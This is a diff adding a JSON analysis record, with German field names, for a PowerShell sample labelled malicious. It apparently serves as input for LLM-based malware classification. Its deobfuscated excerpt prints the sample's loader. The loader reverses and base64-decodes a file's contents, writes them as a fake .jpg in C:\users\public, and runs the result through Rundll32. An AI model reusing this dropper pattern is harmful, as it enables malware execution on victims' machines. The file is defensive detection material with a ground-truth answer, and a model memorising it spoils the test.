@@ -1,0 +1,69 @@
+{
+  "meta": {
+    "quelldatei": "056deb6e3f5de68f9ae2b1ed11f7d3d398a3488387294937bebcb0f8f847b5c9.ps1",
+    "sha256": "056deb6e3f5de68f9ae2b1ed11f7d3d398a3488387294937bebcb0f8f847b5c9",
+    "groesse_bytes": 369,
+    "zeilen": 15,
+    "ground_truth_label": "malicious",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "fix\\data.txt",
+      ";\r\n$r = $b64.ToCharArray();\r\n[array]::Reverse($r);\r\n-join($r);\r\n\r\n$filename = "
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "fix\\data.txt",
+      ";\r\n$r = $b64.ToCharArray();\r\n[array]::Reverse($r);\r\n-join($r);\r\n\r\n$filename = "
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Content"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\users\\public\\agreeBrood.jpg"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "fix\\data.txt",
+      ";\r\n$r = $b64.ToCharArray();\r\n[array]::Reverse($r);\r\n-join($r);\r\n\r\n$filename = "
+    ],
+    "string_anzahl_gesamt": 2,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-Content"
+    ],
+    "auffaellige_tokens": {
+      "frombase64": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "C:\\users\\public\\agreeBrood.jpg"
+      ]
+    },
+    "deobfuskiert_auszug": "$b64 = Get-Content -Path 'fix\\data.txt';\r\n$b64[-1..-($b64.Length)] -join '';\r\n$r = $b64.ToCharArray();\r\n[array]::Reverse($r);\r\n-join($r);\r\n\r\n$filename = 'C:\\users\\public\\agreeBrood.jpg';\r\n$bytes = [Convert]::FromBase64String($r);\r\n[IO.File]::WriteAllBytes($filename, $bytes);\r\n\r\n# start-process regsvr32 $filename;\r\nstart-process Rundll32 $filename,DrawThemeIcon;\r\n\r\n\r\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "Base64-Inhalt dekodieren"
+    ]
+  }
+}
